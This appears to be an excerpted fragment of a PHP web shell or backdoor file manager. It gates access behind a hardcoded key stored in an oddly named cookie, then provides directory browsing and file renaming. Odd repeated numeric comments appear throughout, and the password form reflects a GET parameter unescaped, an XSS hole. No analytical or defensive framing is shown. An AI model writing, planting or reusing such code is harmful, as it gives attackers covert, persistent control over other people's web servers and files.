...
$auth_key = "439a3f2e124ee190eb0f10d2b9fa8d42";
...
$pass = false;
if (isset($_COOKIE['pw_name_86363'])) {
    if(($_COOKIE['pw_name_86363']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_86363'])) {
        if(($_POST['pw_name_86363']) == $auth_key) {
            setcookie("pw_name_86363", $_POST['pw_name_86363']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_86363' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1725669292510423 1725669292736759 1725669292290634 1725669292370203
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1725669292510423 1725669292736759 1725669292290634 1725669292370203
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1725669292510423 1725669292736759 1725669292290634 1725669292370203
            $name = PATH . "/" . $_GET['r'];
